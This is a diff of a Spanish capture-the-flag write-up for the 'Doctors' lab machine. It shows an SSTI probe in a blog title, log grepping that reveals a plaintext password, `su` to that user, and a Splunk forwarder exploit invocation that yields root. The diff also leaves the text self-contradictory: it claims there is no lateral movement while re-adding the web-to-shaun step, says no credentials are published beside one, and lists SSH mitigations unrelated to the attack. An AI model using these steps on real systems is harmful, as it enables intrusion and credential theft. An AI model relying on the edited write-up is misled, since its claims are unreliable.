@@ -40,7 +40,11 @@ echo "<IP> doctors.htb" | sudo tee -a /etc/hosts
 
 En el vhost aparece un blog con registro y «New Message». El 8089 es la consola de gestión de Splunk 8.0.5, que pide autenticación básica.
 
-## Acceso: SSTI en el título del mensaje
+## Enumeración
+
+- Puertos, servicios y usuarios relevantes descritos en «Reconocimiento».
+
+## Foothold
 
 Se publica un mensaje con el título `{{7*7}}` y se visita `/archive`:
 
@@ -61,25 +65,12 @@ id
 # uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
 ```
 
-## De web a shaun
+## Movimiento lateral
 
-`adm` da lectura de logs. Buscando contraseñas en ellos aparece el reseteo de `shaun`:
+- No aplica: la cadena se resuelve en un único host, sin salto lateral.
+- Ver «Escalada de privilegios» para el paso de usuario a administrador.
 
-```bash
-grep -ri "password" /var/log/apache2/ 2>/dev/null
-cat /var/log/apache2/backup
-```
-
-```text
-... /reset?email=shaun&password=Guitar123 ...
-```
-
-```bash
-su shaun
-cat ~/user.txt
-```
-
-## Escalada con Splunk
+## Escalada de privilegios
 
 ```bash
 ps -ef | grep splunkd
@@ -97,9 +88,41 @@ python3 SplunkWhisperer2/PySplunkWhisperer2/PySplunkWhisperer2_remote.py \
 
 La shell vuelve como root y se lee `/root/root.txt`.
 
-## Lecciones
+## Evidencia
+
+- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
+- Los valores reales viven en `private/` y no se publican.
+
+## Lecciones aprendidas
 
 - Un SSTI en un campo que parece decorativo (el título de un post) es ejecución remota.
 - `adm` es lectura de logs, y los logs guardan contraseñas que la gente escribe en formularios.
 - Reutilizar la contraseña del sistema en una herramienta de monitorización es la escalada: Splunk ejecuta como el usuario que lo arranca.
 - Detección: títulos con `{{` o `__globals__`, y procesos `splunkd` lanzando `bash` desde el forwarder.
+
+## Mitigaciones y detección
+
+- Solo claves, sin contraseña, y `AllowUsers`/`fail2ban` para limitar el acceso.
+- No construir plantillas con entrada del usuario; usar sandbox y contexto restringido.
+
+## Referencias
+
+- [ssti](../../../knowledge/web/ssti.md)
+
+## De web a shaun
+
+`adm` da lectura de logs. Buscando contraseñas en ellos aparece el reseteo de `shaun`:
+
+```bash
+grep -ri "password" /var/log/apache2/ 2>/dev/null
+cat /var/log/apache2/backup
+```
+
+```text
+... /reset?email=shaun&password=Guitar123 ...
+```
+
+```bash
+su shaun
+cat ~/user.txt
+```
